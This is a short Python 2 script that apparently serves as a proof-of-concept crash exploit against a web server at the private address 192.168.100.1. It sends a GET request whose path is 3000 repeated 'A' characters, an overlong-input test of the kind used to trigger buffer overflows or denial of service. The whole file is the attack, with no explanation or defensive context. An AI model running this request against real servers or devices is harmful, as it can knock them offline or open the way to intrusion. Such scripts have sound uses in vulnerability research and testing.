import httplib

conn = httplib.HTTPConnection("192.168.100.1")
conn.request("GET", "/" + "A" * 3000 + ".html")
resp = conn.getresponse()
data = resp.read()
conn.close()